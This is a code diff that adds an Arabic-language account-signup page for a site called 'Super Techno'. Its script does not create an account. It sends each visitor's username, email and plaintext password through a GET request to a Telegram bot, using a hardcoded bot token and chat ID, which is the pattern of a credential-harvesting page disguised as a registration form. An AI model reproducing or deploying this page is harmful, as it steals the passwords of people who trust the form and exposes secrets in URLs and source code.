@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنشاء حساب - سوبر تــــــكنو</title>
+    <link rel="stylesheet" href="wep2.css">
+    <style>
+        .notification {
+            display: none;
+            padding: 10px;
+            border-radius: 5px;
+            color: #fff;
+            margin-top: 10px;
+        }
+        .notification.success {
+            background-color: #28a745; /* أخضر */
+        }
+        .notification.error {
+            background-color: #dc3545; /* أحمر */
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <h1>ســـــــوبر تــــــكنو</h1>
+    </header>
+
+    <div class="signup-container">
+        <div class="signup-box">
+            <h2>إنشاء حساب جديد</h2>
+            <form id="signupForm">
+                <div class="input-group">
+                    <label for="username">اسم المستخدم</label>
+                    <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
+                </div>
+                <div class="input-group">
+                    <label for="email">البريد الإلكتروني</label>
+                    <input type="email" id="email" placeholder="أدخل البريد الإلكتروني" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                </div>
+                <div class="input-group">
+                    <label for="confirm-password">تأكيد كلمة المرور</label>
+                    <input type="password" id="confirm-password" placeholder="أعد إدخال كلمة المرور" required>
+                </div>
+                <button type="submit" class="signup-btn">إنشاء الحساب</button>
+            </form>
+            <div id="notification" class="notification"></div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>جميع الحقوق محفوظة لدى <span>ســـــــوبر تــــــكنو</span> للخدمات الالكترونية</p>
+    </footer>
+
+    <script>
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // التحقق من طول كلمة المرور
+            const password = document.getElementById('password').value;
+            if (!/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/.test(password)) {
+                showNotification('كلمة المرور يجب أن تتكون من 12 حرفًا على الأقل، تحتوي على أحرف كبيرة وصغيرة وأرقام ورموز.', 'error');
+                return;
+            }
+
+            // جمع البيانات
+            const formData = {
+                username: document.getElementById('username').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value
+            };
+
+            // إرسال البيانات إلى تلغرام عبر البوت
+            const botToken = '7226268995:AAH7NSYfl3yO72mTMjsL7S-EfcXvW8N1ME0'; // ضع هنا الـ Token الخاص بالبوت
+            const chatId = '@mmssrtff0'; // ضع هنا معرف القناة أو المستخدم
+
+            const message = `
+                تم إنشاء حساب جديد:
+                اسم المستخدم: ${formData.username}
+                البريد الإلكتروني: ${formData.email}
+                كلمة المرور: ${formData.password}
+            `;
+
+            // إعداد الرابط لإرسال الرسالة عبر API تلغرام
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // إرسال الطلب
+            fetch(telegramURL).then(response => response.json()).then(data => {
+                if (data.ok) {
+                    showNotification('تم إرسال البيانات بنجاح!', 'success');
+                } else {
+                    showNotification('حدث خطأ، حاول مرة أخرى.', 'error');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                showNotification('حدث خطأ، حاول مرة أخرى.', 'error');
+            });
+        });
+
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = `notification ${type}`;
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000); // إخفاء الرسالة بعد 5 ثوانٍ
+        }
+    </script>
+</body>
+</html>
